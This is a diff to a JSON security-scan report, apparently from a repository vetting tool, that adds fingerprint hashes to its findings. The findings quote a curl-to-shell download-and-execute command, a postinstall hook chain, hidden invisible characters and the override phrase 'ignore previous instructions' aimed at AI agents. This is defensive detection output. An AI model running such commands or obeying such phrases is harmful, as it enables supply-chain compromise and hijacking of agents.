@@ -116,6 +116,9 @@
       "results": [
         {
           "ruleId": "RC-AGENT-002",
+          "partialFingerprints": {
+            "primaryLocationLineHash": "repovet:v1:d0f39a164bed3a62b9ac266f969a6a7d211231b42ad8983ec2e2553e5a915437"
+          },
           "level": "error",
           "message": {
             "text": "2 invisible tag characters hide this text: \"Hi\""
@@ -146,6 +149,9 @@
         },
         {
           "ruleId": "RC-AUTO-090",
+          "partialFingerprints": {
+            "primaryLocationLineHash": "repovet:v1:585f60e0dd37a3a63c80d8a893de639169d03181ecd285f6db083714d01b713c"
+          },
           "level": "error",
           "message": {
             "text": "npm install script runs on install and reaches download-and-execute (RC-DLX-001) after 3 steps: package.json -> x.js -> x.sh"
@@ -223,6 +229,9 @@
         },
         {
           "ruleId": "RC-AGENT-020",
+          "partialFingerprints": {
+            "primaryLocationLineHash": "repovet:v1:ccd2f2992fb4b677a0c65d6b39f18138cfc41c44b368385fe19e9c64cada4d05"
+          },
           "level": "error",
           "message": {
             "text": "Agent instruction: ignore previous instructions"
@@ -253,6 +262,9 @@
         },
         {
           "ruleId": "RC-AGENT-020",
+          "partialFingerprints": {
+            "primaryLocationLineHash": "repovet:v1:e94439484767cc27b620d5bf9afa12d60ad253d880d71b89e59e7f190a7c03ba"
+          },
           "level": "error",
           "message": {
             "text": "Agent instruction: ignore previous instructions"
@@ -283,6 +295,9 @@
         },
         {
           "ruleId": "RC-AUTO-001",
+          "partialFingerprints": {
+            "primaryLocationLineHash": "repovet:v1:476063a58f1165e9dd2f59657070b64af58faa4363bffd81116913d73ae2cdd7"
+          },
           "level": "warning",
           "message": {
             "text": "package.json defines a 'postinstall' script: node x.js"
@@ -311,6 +326,9 @@
         },
         {
           "ruleId": "RC-DLX-001",
+          "partialFingerprints": {
+            "primaryLocationLineHash": "repovet:v1:b913e3ba23d3c92c40269fbf1c64e137cf5bdab32f5ffc1b54aca2f8f0058101"
+          },
           "level": "warning",
           "message": {
             "text": "Downloads and runs code in one step: curl -s https://example.invalid/x | sh"
@@ -341,6 +359,9 @@
         },
         {
           "ruleId": "RC-TRUST-001",
+          "partialFingerprints": {
+            "primaryLocationLineHash": "repovet:v1:55aabeb3bfb52daa42319a7ba3590126554e3ecd3cb2e7b9ee31bfb30ed3e6ad"
+          },
           "level": "note",
           "message": {
             "text": "Something was found."
@@ -354,6 +375,9 @@
         },
         {
           "ruleId": "RC-AGENT-001",
+          "partialFingerprints": {
+            "primaryLocationLineHash": "repovet:v1:10e98a33489f17f7a472da19ca9f434c8fed94233215d0f8b3097e9f3b2f6f6d"
+          },
           "level": "note",
           "message": {
             "text": "AI agent file: AGENTS.md"
@@ -381,6 +405,9 @@
         },
         {
           "ruleId": "RC-AGENT-001",
+          "partialFingerprints": {
+            "primaryLocationLineHash": "repovet:v1:10e98a33489f17f7a472da19ca9f434c8fed94233215d0f8b3097e9f3b2f6f6d"
+          },
           "level": "note",
           "message": {
             "text": "AI agent file: CLAUDE.md"
@@ -413,6 +440,7 @@
         "online": false,
         "filesScanned": 1284,
         "rulesLoaded": 3,
+        "rulesetDigest": null,
         "minSeverity": "info",
         "hiddenBelowMinSeverity": 0,
         "facts": {},
